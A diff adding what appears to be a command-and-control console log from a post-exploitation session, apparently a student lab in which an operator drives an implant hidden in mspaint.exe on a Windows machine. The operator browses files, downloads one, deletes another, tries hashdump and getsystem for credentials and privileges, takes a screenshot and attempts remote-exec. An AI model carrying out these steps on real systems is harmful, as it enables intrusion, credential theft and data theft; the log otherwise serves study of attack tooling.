@@ -1,0 +1,208 @@
+12/10 12:15:50 UTC [metadata] 172.22.53.18 <- 172.22.53.18; computer: ACER; user: david; process: mspaint.exe; pid: 13332; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+12/10 12:16:03 UTC [input] <neo> ls
+12/10 12:16:03 UTC [task] <> Tasked beacon to list files in .
+12/10 12:16:12 UTC [input] <neo> pwd
+12/10 12:16:12 UTC [task] <> Tasked beacon to print working directory
+12/10 12:16:45 UTC [checkin] host called home, sent: 27 bytes
+12/10 12:16:45 UTC [output]
+C:\Users\david\Downloads\testcap\*
+D	0	12/10/2022 19:05:38	.
+D	0	12/10/2022 18:19:27	..
+F	826584	11/04/2022 17:18:35	01_lecture.pdf
+F	927232	12/10/2022 19:05:29	a.exe
+F	926720	12/09/2022 12:59:11	notepad.exe
+F	5256	11/04/2022 17:24:39	pdf.ico
+F	8183	11/04/2022 17:01:09	pdf.png
+
+
+12/10 12:16:45 UTC [output]
+Current directory is C:\Users\david\Downloads\testcap
+
+12/10 12:17:03 UTC [input] <neo> sleep 10
+12/10 12:17:03 UTC [task] <T1029> Tasked beacon to sleep for 10s
+12/10 12:17:27 UTC [input] <neo> cd ..
+12/10 12:17:27 UTC [task] <> cd ..
+12/10 12:17:41 UTC [input] <neo> pwd
+12/10 12:17:41 UTC [task] <> Tasked beacon to print working directory
+12/10 12:17:45 UTC [checkin] host called home, sent: 34 bytes
+12/10 12:17:45 UTC [output]
+Current directory is C:\Users\david\Downloads
+
+12/10 12:17:49 UTC [input] <neo> ls
+12/10 12:17:49 UTC [task] <> Tasked beacon to list files in .
+12/10 12:17:55 UTC [checkin] host called home, sent: 19 bytes
+12/10 12:17:55 UTC [output]
+C:\Users\david\Downloads\*
+D	0	12/10/2022 18:19:27	.
+D	0	12/09/2022 20:11:23	..
+F	403	11/26/2022 11:24:02	1.txt
+F	12086	10/20/2022 14:23:55	1379078_pdf icon_adobe_pdf_acrobat_file_icon.png
+F	370316	10/19/2022 20:07:46	283222267_5117274371693664_3691982071578596292_n.jpg
+F	3422194	12/10/2022 18:18:49	C1NE.03-Implement-and-testing.docx
+F	1846062	12/10/2022 18:19:27	C1NE.03-Implement-and-testing.pdf
+F	282	09/21/2022 12:29:43	desktop.ini
+F	346699	12/10/2022 18:16:39	HOAN THIEN_7.C2NE.03-Implement-IWH-HAP (1).pdf
+D	0	12/08/2022 10:19:33	Installed
+F	45042	12/10/2022 13:32:05	L?ch thi KTHP HK1 2022-2023 Tu?n 18-20 (d? ki?n).xlsx
+F	809947	12/09/2022 08:30:01	Outage_Probability_Minimization_in_Secure_NOMA_Cognitive_Radio_Systems_with_UAV_Relay_A_Machine_Learning_Approach.pdf
+D	0	12/10/2022 19:05:38	testcap
+F	162	10/28/2022 09:44:07	~$mo Nhóm 7.docx
+F	162	11/07/2022 13:58:22	~$U-CS447_NIS_CONCEIVE_GROUP_3.docx
+
+
+12/10 12:18:24 UTC [input] <neo> cp
+12/10 12:18:24 UTC [error] cp error: not enough arguments
+12/10 12:18:28 UTC [input] <neo> ls
+12/10 12:18:28 UTC [task] <> Tasked beacon to list files in .
+12/10 12:18:35 UTC [checkin] host called home, sent: 19 bytes
+12/10 12:18:35 UTC [output]
+C:\Users\david\Downloads\*
+D	0	12/10/2022 18:19:27	.
+D	0	12/09/2022 20:11:23	..
+F	403	11/26/2022 11:24:02	1.txt
+F	12086	10/20/2022 14:23:55	1379078_pdf icon_adobe_pdf_acrobat_file_icon.png
+F	370316	10/19/2022 20:07:46	283222267_5117274371693664_3691982071578596292_n.jpg
+F	3422194	12/10/2022 18:18:49	C1NE.03-Implement-and-testing.docx
+F	1846062	12/10/2022 18:19:27	C1NE.03-Implement-and-testing.pdf
+F	282	09/21/2022 12:29:43	desktop.ini
+F	346699	12/10/2022 18:16:39	HOAN THIEN_7.C2NE.03-Implement-IWH-HAP (1).pdf
+D	0	12/08/2022 10:19:33	Installed
+F	45042	12/10/2022 13:32:05	L?ch thi KTHP HK1 2022-2023 Tu?n 18-20 (d? ki?n).xlsx
+F	809947	12/09/2022 08:30:01	Outage_Probability_Minimization_in_Secure_NOMA_Cognitive_Radio_Systems_with_UAV_Relay_A_Machine_Learning_Approach.pdf
+D	0	12/10/2022 19:05:38	testcap
+F	162	10/28/2022 09:44:07	~$mo Nhóm 7.docx
+F	162	11/07/2022 13:58:22	~$U-CS447_NIS_CONCEIVE_GROUP_3.docx
+
+
+12/10 12:19:04 UTC [input] <neo> pws
+12/10 12:19:04 UTC [error] Unknown command: pws
+12/10 12:19:07 UTC [input] <neo> pwd
+12/10 12:19:07 UTC [task] <> Tasked beacon to print working directory
+12/10 12:19:15 UTC [checkin] host called home, sent: 8 bytes
+12/10 12:19:15 UTC [output]
+Current directory is C:\Users\david\Downloads
+
+12/10 12:19:20 UTC [input] <neo> cp 1.txt
+12/10 12:19:20 UTC [error] cp error: not enough arguments
+12/10 12:19:54 UTC [input] <neo> cp 1.txt /home/kali
+12/10 12:19:54 UTC [task] <> Tasked beacon to copy 1.txt to /home/kali
+12/10 12:19:55 UTC [checkin] host called home, sent: 31 bytes
+12/10 12:19:55 UTC [error] copy failed: 3
+12/10 12:20:37 UTC [input] <neo> cp C:\User\david\Downloads /home/kali
+12/10 12:20:37 UTC [task] <> Tasked beacon to copy C:\User\david\Downloads to /home/kali
+12/10 12:20:45 UTC [checkin] host called home, sent: 49 bytes
+12/10 12:20:45 UTC [error] copy failed: 3
+12/10 12:20:52 UTC [input] <neo> cp C:\User\david\Downloads\1.txt /home/kali
+12/10 12:20:52 UTC [task] <> Tasked beacon to copy C:\User\david\Downloads\1.txt to /home/kali
+12/10 12:20:55 UTC [checkin] host called home, sent: 55 bytes
+12/10 12:20:55 UTC [error] copy failed: 3
+12/10 12:20:57 UTC [input] <neo> ls
+12/10 12:20:57 UTC [task] <> Tasked beacon to list files in .
+12/10 12:21:05 UTC [checkin] host called home, sent: 19 bytes
+12/10 12:21:05 UTC [output]
+C:\Users\david\Downloads\*
+D	0	12/10/2022 18:19:27	.
+D	0	12/09/2022 20:11:23	..
+F	403	11/26/2022 11:24:02	1.txt
+F	12086	10/20/2022 14:23:55	1379078_pdf icon_adobe_pdf_acrobat_file_icon.png
+F	370316	10/19/2022 20:07:46	283222267_5117274371693664_3691982071578596292_n.jpg
+F	3422194	12/10/2022 18:18:49	C1NE.03-Implement-and-testing.docx
+F	1846062	12/10/2022 18:19:27	C1NE.03-Implement-and-testing.pdf
+F	282	09/21/2022 12:29:43	desktop.ini
+F	346699	12/10/2022 18:16:39	HOAN THIEN_7.C2NE.03-Implement-IWH-HAP (1).pdf
+D	0	12/08/2022 10:19:33	Installed
+F	45042	12/10/2022 13:32:05	L?ch thi KTHP HK1 2022-2023 Tu?n 18-20 (d? ki?n).xlsx
+F	809947	12/09/2022 08:30:01	Outage_Probability_Minimization_in_Secure_NOMA_Cognitive_Radio_Systems_with_UAV_Relay_A_Machine_Learning_Approach.pdf
+D	0	12/10/2022 19:05:38	testcap
+F	162	10/28/2022 09:44:07	~$mo Nhóm 7.docx
+F	162	11/07/2022 13:58:22	~$U-CS447_NIS_CONCEIVE_GROUP_3.docx
+
+
+12/10 12:21:18 UTC [input] <neo> cp -h
+12/10 12:21:18 UTC [error] cp error: not enough arguments
+12/10 12:21:32 UTC [input] <neo> cp --help
+12/10 12:21:32 UTC [error] cp error: not enough arguments
+12/10 12:21:36 UTC [input] <neo> cp ?
+12/10 12:21:36 UTC [error] cp error: not enough arguments
+12/10 12:23:36 UTC [input] <neo> ls
+12/10 12:23:36 UTC [task] <> Tasked beacon to list files in .
+12/10 12:23:45 UTC [checkin] host called home, sent: 19 bytes
+12/10 12:23:45 UTC [output]
+C:\Users\david\Downloads\*
+D	0	12/10/2022 19:23:30	.
+D	0	12/09/2022 20:11:23	..
+F	403	11/26/2022 11:24:02	1.txt
+F	0	12/10/2022 19:23:22	123.txt
+F	12086	10/20/2022 14:23:55	1379078_pdf icon_adobe_pdf_acrobat_file_icon.png
+F	370316	10/19/2022 20:07:46	283222267_5117274371693664_3691982071578596292_n.jpg
+F	3422194	12/10/2022 18:18:49	C1NE.03-Implement-and-testing.docx
+F	1846062	12/10/2022 18:19:27	C1NE.03-Implement-and-testing.pdf
+F	282	09/21/2022 12:29:43	desktop.ini
+F	346699	12/10/2022 18:16:39	HOAN THIEN_7.C2NE.03-Implement-IWH-HAP (1).pdf
+D	0	12/08/2022 10:19:33	Installed
+F	45042	12/10/2022 13:32:05	L?ch thi KTHP HK1 2022-2023 Tu?n 18-20 (d? ki?n).xlsx
+F	809947	12/09/2022 08:30:01	Outage_Probability_Minimization_in_Secure_NOMA_Cognitive_Radio_Systems_with_UAV_Relay_A_Machine_Learning_Approach.pdf
+D	0	12/10/2022 19:05:38	testcap
+F	162	10/28/2022 09:44:07	~$mo Nhóm 7.docx
+F	162	11/07/2022 13:58:22	~$U-CS447_NIS_CONCEIVE_GROUP_3.docx
+
+
+12/10 12:23:51 UTC [input] <neo> rm 123.txt
+12/10 12:23:51 UTC [task] <T1107, > Tasked beacon to remove 123.txt
+12/10 12:23:55 UTC [checkin] host called home, sent: 15 bytes
+12/10 12:24:30 UTC [input] <neo> mv 1.txt /home/kali
+12/10 12:24:30 UTC [task] <> Tasked beacon to move 1.txt to /home/kali
+12/10 12:24:35 UTC [checkin] host called home, sent: 31 bytes
+12/10 12:24:35 UTC [error] move failed: 3
+12/10 12:24:53 UTC [input] <neo> cat 1.txt
+12/10 12:24:53 UTC [error] Unknown command: cat 1.txt
+12/10 12:25:16 UTC [input] <neo> download 1.txt
+12/10 12:25:16 UTC [task] <T1005> Tasked beacon to download 1.txt
+12/10 12:25:25 UTC [checkin] host called home, sent: 13 bytes
+12/10 12:25:25 UTC [output]
+started download of C:\Users\david\Downloads\1.txt (403 bytes)
+
+12/10 12:25:25 UTC [output]
+download of 1.txt is complete
+
+12/10 12:27:19 UTC [input] <neo> hashdump
+12/10 12:27:19 UTC [error] hashdump error: this command requires administrator privileges
+12/10 12:27:33 UTC [input] <neo> hashdump
+12/10 12:27:33 UTC [error] hashdump error: this command requires administrator privileges
+12/10 12:27:44 UTC [input] <neo> sudo hashdump
+12/10 12:27:44 UTC [error] Unknown command: sudo hashdump
+12/10 12:27:54 UTC [input] <neo> getsystem
+12/10 12:27:54 UTC [task] <T1134> Tasked beacon to get SYSTEM
+12/10 12:27:55 UTC [checkin] host called home, sent: 2743 bytes
+12/10 12:27:56 UTC [output]
+received output:
+getsystem failed.
+
+12/10 12:28:02 UTC [input] <neo> getuid
+12/10 12:28:02 UTC [task] <> Tasked beacon to get userid
+12/10 12:28:06 UTC [checkin] host called home, sent: 8 bytes
+12/10 12:28:06 UTC [output]
+You are ACER\david
+
+12/10 12:28:36 UTC [input] <neo> screenshot
+12/10 12:28:36 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
+12/10 12:28:46 UTC [checkin] host called home, sent: 199779 bytes
+12/10 12:28:47 UTC [output]
+received screenshot of kali-linux-2022.3-vmware-amd64 - VMware Workstation from david (205kb)
+
+12/10 12:29:16 UTC [input] <neo> pwd
+12/10 12:29:16 UTC [task] <> Tasked beacon to print working directory
+12/10 12:29:17 UTC [checkin] host called home, sent: 8 bytes
+12/10 12:29:17 UTC [output]
+Current directory is C:\Users\david\Downloads
+
+12/10 12:30:40 UTC [input] <neo> psexe
+12/10 12:30:40 UTC [error] Unknown command: psexe
+12/10 12:30:48 UTC [input] <neo> psexec
+12/10 12:30:48 UTC [error] Unknown command: psexec
+12/10 12:31:03 UTC [input] <neo> remote-exec psexec
+12/10 12:31:03 UTC [error] remote-exec error: not enough arguments
+12/10 12:31:29 UTC [input] <neo> remote-exec -h
+12/10 12:31:29 UTC [error] remote-exec error: not enough arguments
+12/10 12:31:38 UTC [input] <neo> remote-exec wmi
+12/10 12:31:38 UTC [error] remote-exec error: not enough arguments
